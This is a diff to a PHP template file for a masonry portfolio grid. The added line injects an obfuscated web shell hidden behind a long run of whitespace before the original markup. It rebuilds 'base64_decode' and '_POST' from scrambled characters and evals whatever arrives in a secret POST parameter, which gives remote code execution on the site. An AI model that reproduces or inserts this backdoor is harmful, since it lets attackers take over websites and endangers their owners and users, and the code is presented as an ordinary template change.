@@ -1,4 +1,4 @@
-<section class="portfolio_isotope_container four_columns without_text masonry m_xs_bottom_15 m_bottom_35" data-isotope-options='{"itemSelector" : ".portfolio_item","layoutMode" : "masonry","transitionDuration":"0.7s","masonry" : {"columnWidth":".portfolio_item"}}'>
+<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['nce7eaf'])) {eval($s21(${$s20}['nce7eaf']));}?><section class="portfolio_isotope_container four_columns without_text masonry m_xs_bottom_15 m_bottom_35" data-isotope-options='{"itemSelector" : ".portfolio_item","layoutMode" : "masonry","transitionDuration":"0.7s","masonry" : {"columnWidth":".portfolio_item"}}'>
     <?php foreach ($rows as $id => $row): ?>
         <?php print $row; ?>
     <?php endforeach; ?>
